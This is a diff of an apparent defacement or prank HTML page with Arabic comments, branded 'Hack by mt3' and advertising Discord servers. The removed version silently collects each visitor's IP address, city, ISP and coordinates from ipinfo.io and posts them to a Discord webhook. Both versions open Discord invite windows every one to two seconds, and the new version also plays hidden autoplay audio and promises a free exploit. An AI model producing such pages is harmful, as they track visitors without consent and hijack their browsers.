@@ -1,272 +1,150 @@
-
-
-w<!DOCTYPE html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>d7h</title>
-<style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title></title>
+  <style>
     body {
-        margin: 0;
-        padding: 0;
-        font-family: 'Courier New', Courier, monospace;
-        color: #490a0a;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        flex-direction: column;
-        text-align: center;
-        overflow: hidden;
-        background-color: rgb(0, 0, 0); /* لون الخلفية الأسود */
+      margin: 0;
+      padding: 0;
+      background: radial-gradient(circle at top left, #1a1a1a 0%, #2e2e3a 30%, #000000 70%);
+      font-family: 'Courier New', Courier, monospace;
+      color: #9f8663;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      text-align: center;
+      overflow: hidden;
     }
-
-    /* صفحة الفيديو الأول */
-    .background-video {
-        position: absolute;
-        top: 50%; /* جعل الفيديو في منتصف الصفحة */
-        left: 50%;
-        width: 70%; /* التحكم في عرض الفيديو */
-        height: auto; /* الاحتفاظ بنسبة العرض إلى الارتفاع */
-        transform: translate(-50%, -50%); /* لضمان أن الفيديو يظهر في المركز */
-        z-index: -1;
-        object-fit: contain; /* التحكم في كيفية عرض محتوى الفيديو */
+    #content {
+      display: none;
+      opacity: 0;
+      transition: opacity 2s ease;
     }
-
-    /* نص فوق الفيديو الأول */
-    .video-text {
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        font-size: 2em;
-        color: rgb(255, 0, 0);
-        text-shadow: 0px 0px 8px rgb(240, 0, 0), 0px 0px 15px rgb(255, 0, 0), 0px 0px 25px rgb(255, 0, 0);
-        letter-spacing: 2px;
-        animation: blink 1.5s infinite alternate;
-        z-index: 1;
+    .video-container img,
+    .video-container video {
+      width: 400px;
+      height: auto;
+      border: 2px solid #c2c2c2;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.7);
     }
-
-    /* تأثير الوميض */
-    @keyframes blink {
-        0% { opacity: 1; }
-        100% { opacity: 0.2; }
+    .extra-video {
+      margin-top: 15px;
     }
-
-    /* صفحة المحتوى الثاني */
-    .content {
-        display: none; /* إخفاء المحتوى الثاني في البداية */
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        z-index: 1;
-        position: relative;
-        height: 100vh;
-        width: 100%;
-    }
-
-    /* الخلفية الثانية (فيديو في الصفحة الثانية) */
-    .background-video-second {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
-        z-index: -1;
-    }
-
-    /* صورة بدون تأثيرات */
-    .image-container img {
-        max-width: 80%; /* تحدد الحد الأقصى لحجم الصورة */
-        height: auto; /* لحفاظ الصورة على النسب */
-        margin: 20px auto; /* يضع الصورة في الوسط أفقيًا */
-        display: block; /* ضمان أن الصورة ستكون في منتصف الصفحة */
-    }
-
-    /* نص "discord.gg/mt3" */
-    .text {
-        margin-top: 20px;
-        font-size: 3em;
-        background: linear-gradient(45deg, rgb(255, 0, 0), rgb(255, 0, 0), rgb(255, 0, 0));
-        -webkit-background-clip: text;
-        color: transparent; /* النص سيكون شفافًا لأن التدرج هو الذي سيظهر */
-        text-shadow: 0px 0px 8px rgba(255, 0, 0, 0.5), 
-                    0px 0px 15px rgba(255, 0, 0, 0.5), 
-                    0px 0px 25px rgba(255, 0, 0, 0.5);
-        letter-spacing: 4.5px;
-    }
-
-    /* معلومات الIP */
     .info {
-        margin-top: 20px;
-        font-size: 1.5em;
-        background: linear-gradient(45deg, rgb(223, 0, 0), rgb(255, 0, 0), rgb(255, 0, 0));
-        -webkit-background-clip: text;
-        color: transparent; /* النص سيكون شفافًا لأن التدرج هو الذي سيظهر */
-        text-shadow: 0px 0px 8px rgba(255, 0, 0, 0.5), 
-                    0px 0px 15px rgba(255, 0, 0, 0.5), 
-                    0px 0px 25px rgba(255, 0, 0, 0.5);
-        letter-spacing: 4.5px;
-        white-space: pre-wrap;
+      margin-top: 20px;
+      font-size: 1.5em;
+      color: #fff;
+      text-shadow: 0 0 8px #fff, 0 0 15px #fff, 0 0 25px #fff;
+      letter-spacing: 4.5px;
+      white-space: pre-wrap;
     }
-
-    /* شريط النص المتحرك داخل الفيديو الثاني */
-    .marquee-container {
-        position: relative;
-        width: 100%;
-        margin-top: 20px;
-        overflow: hidden;
+    .text {
+      margin-top: 5px;
+      font-size: 75px;
+      color: #fff;
+      text-shadow: 0 0 8px #fff, 0 0 15px #fff, 0 0 25px #fff;
+      letter-spacing: 4.5px;
     }
-
-    .marquee {
-        white-space: nowrap;
-        overflow: hidden;
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -2;
+      pointer-events: none;
     }
-
-    .marquee span {
-        display: inline-block;
-        font-size: 2em;
-        color: #ff0000;
-        text-shadow: 0px 0px 8px #ff0000, 
-                    0px 0px 15px #ff0000, 
-                    0px 0px 25px #ff0000;
-        animation: scroll 10s linear infinite;
-    }
-
-    @keyframes scroll {
-        0% { transform: translateX(100%); }
-        100% { transform: translateX(-100%); }
-    }
-</style>
+  </style>
 </head>
 <body>
+  <canvas id="matrix-canvas"></canvas>
 
-<!-- الفيديو الأول -->
-<video class="background-video" autoplay muted>
-    <source src="3354ycgwh1.mp4" type="video/mp4">
-    Your browser does not support the video tag.
-</video>
-
-<!-- نص فوق الفيديو الأول -->
-<div class="video-text"> Hack by mt3 </div>
-
-<!-- محتوى الصفحة الثانية -->
-<div class="content">
-    <video class="background-video-second" autoplay loop muted>
-        <source src="2f.mp4" type="video/mp4">
-        Your browser does not support the video tag.
-    </video>
-
-    <!-- صورة بدون تأثيرات -->
-    <div class="image-container">
-        <img src="https://th.bing.com/th/id/OIP.WlFBBNJjin5rM4LQWtLymAAAAA?w=261&h=147&c=7&r=0&o=5&pid=1.7" alt="">
-    </div>
-
-    <!-- نص "discord.gg/d-7H" -->
-    <div class="text">discord.gg/mt3</div>
-
-    <!-- معلومات الIP مع البورت -->
-    <div class="info" id="ip-info">Loading IP Info...</div>
-
-    <!-- شريط النص المتحرك داخل الفيديو الثاني -->
-    <div class="marquee-container">
-        <div class="marquee">
-            <span>
-                hack by mt3  hack by mt3
-            </span>
-        </div>
-    </div>
-
-    <!-- الصوت في الخلفية -->
-    <audio id="background-audio" loop>
-        <source src="2f.mp4" type="audio/mp3">
-        Your browser does not support the audio element.
-    </audio>
-</div>
-
-<script>
-    // الانتقال من الفيديو إلى المحتوى الثاني عند انتهائه
-    const video = document.querySelector('.background-video');
-    const content = document.querySelector('.content');
-
-    video.onended = function() {
-        content.style.display = 'flex'; // عرض المحتوى الثاني
-        video.style.display = 'none'; // إخفاء الفيديو
-        document.getElementById('background-audio').play()
-            .catch(() => console.log("يجب تفعيل الصوت يدويًا"));
-    };
-
-
-
-  <!-- مشغل SoundCloud بالرابط الجديد -->
-  <div class="music-player">
-    <iframe 
-      width="0" 
-      height="0" 
-      scrolling="no" 
-      frameborder="no" 
-      allow="autoplay" 
-      src="https://soundcloud.com/arab-rap/klash-ft-bazoka_west-coast-gz">
-    </iframe>
+  <div class="gif-container">
+    <img src="" alt="" />
   </div>
 
+  <div id="content">
+    <div class="video-container">
+      <img src="https://cdn.discordapp.com/attachments/1399008464209969162/1399009122925547590/40DC725F-1CAD-4ED1-995E-F603B01055EB.jpg" alt="Banner" />
+    </div>
 
-    // Fetch IP information without API token
-    fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            const { ip, country, city, region, loc, org, timezone } = data;
+    <!-- موسيقى الخلفية -->
+    <audio autoplay loop hidden>
+      <source src="https://cdn.discordapp.com/attachments/1386786224102178961/1400460401128505415/Download.mp3?ex=688cb7e2&is=688b6662&hm=79cc5b80e1518522e3512834d95a513fcbab580522f3c59bf3ace7b6beb4d12d&" type="audio/mpeg" />
+    </audio>
 
-            // تحديد البورت بناءً على البروتوكول
-            const port = window.location.port || (location.protocol === 'https:' ? 'b-52 511' : 'b-52 511');
+    <!-- الفيديو اللي يشتغل مع ظهور IP -->
+    <div class="extra-video" id="ip-video" style="display:none;">
+      <video autoplay muted loop playsinline width="400" style="border-radius: 15px; border: 2px solid #c2c2c2; box-shadow: 0 0 15px rgba(255, 255, 255, 0.7);">
+        <source src="https://cdn.discordapp.com/attachments/1386786224102178961/1400462682745868369/snaptik_7516279931672857864.mp4?ex=688cba02&is=688b6882&hm=76164df77e20cb830a6faef11a5d95ed53ba6576cfca670e7adf8eb3db5a0399&" type="video/mp4">
+      </video>
+    </div>
 
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.innerHTML = `  Hacked by discord.gg/mt8
-<strong>IP:</strong><span>"${ip}"</span><br>
-<strong>Port:</strong><span style="color: #ffd700">${port}</span><br>
-<strong>City:</strong><span>"${city}"</span><br>
-<strong>Region:</strong><span>"${region}"</span><br>
-<strong>Country:</strong><span>"${country}"</span><br>
-<strong>Location:</strong><span>"${loc}"</span><br>
-<strong>ISP:</strong><span>"${org}"</span><br>
-<strong>Timezone:</strong><span>"${timezone}"</span>`;
+    <div class="info" id="ip-info"></div>
+  </div>
 
-            const dateTime = new Date().toLocaleString();
-            const webhookUrl = '';
-            
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: `⚠️ **سبك ** ⚠️\n\n` +
-                             `**IP:** \`${ip}\`\n` +
-                             `**Port:** \`${port}\`\n` +
-                             `**Location:** ${country} - ${city}\n` +
-                             `**Cmt3dinates:** ${loc}\n` +
-                             `**ISP:** ${org}\n` +
-                             `**Time:** ${dateTime}`
-                })
-            });
-        });
-</script>
+  <script>
+    const canvas = document.getElementById('matrix-canvas');
+    const ctx = canvas.getContext('2d');
+    let width, height, columns, drops;
 
-<!-- فتح نوافذ Discord تلقائيًا -->
-<script>
-    // الرابط الذي تريد فتحه
-    const linkToOpen = "https://discord.gg/mt3";
+    function setupCanvas() {
+      canvas.width = width = window.innerWidth;
+      canvas.height = height = window.innerHeight;
+      columns = Math.floor(width / 20);
+      drops = Array(columns).fill(1);
+    }
 
-    // فتح نافذتين تلقائيًا كل 4 ثوانٍ
-    setInterval(() => {
-        // فتح النافذة الأولى
-        window.open(linkToOpen, '_blank');
-        
-        // الانتظار لفترة قصيرة (500 ميلي ثانية) قبل فتح النافذة الثانية
-        setTimeout(() => {
-            window.open(linkToOpen, '_blank');
-        }, 500); // 500 ميلي ثانية = 0.5 ثانية
-    }, 1000); // 4000 ميلي ثانية = 4 ثوانٍ
-</script>
+    function drawMatrix() {
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+      ctx.fillRect(0, 0, width, height);
+      ctx.fillStyle = '#888';
+      ctx.font = '16px Courier New';
+      for (let i = 0; i < drops.length; i++) {
+        const text = i % 2 === 0 ? '5' : '0';
+        ctx.fillText(text, i * 20, drops[i] * 20);
+        if (drops[i] * 20 > height || Math.random() > 0.975) drops[i] = 0;
+        if (Math.random() > 0.5) drops[i]++;
+      }
+      setTimeout(drawMatrix, 70);
+    }
+
+    window.addEventListener('resize', setupCanvas);
+    setupCanvas();
+    drawMatrix();
+
+    setTimeout(() => {
+      document.querySelector('.gif-container').style.display = 'none';
+      const content = document.getElementById('content');
+      content.style.display = 'block';
+      setTimeout(() => {
+        content.style.opacity = 1;
+      }, 200);
+    }, 200);
+
+    // هنا استبدلت المتغيرات بنص ثابت "TEXT"
+    const infoDiv = document.getElementById('ip-info');
+    infoDiv.innerHTML = `
+<strong></strong>f!ake Respcet<br>
+<strong>City:</strong>حياكم الدسكورد راح ننزل الثغرة مجانا!<br>
+<strong></strong>https://discord.gg/tujt5akq<br>
+`;
+
+    // أظهر الفيديو بعد وضع النصوص
+    document.getElementById('ip-video').style.display = 'block';
+
+    setInterval(function () {
+      if (window.invokeNative) {
+        window.invokeNative('openUrl', 'https://discord.gg/tujt5akq');
+      } else {
+        window.open('https://discord.gg/tujt5akq', '_blank');
+      }
+    }, 2000);
+  </script>
 </body>
 </html>
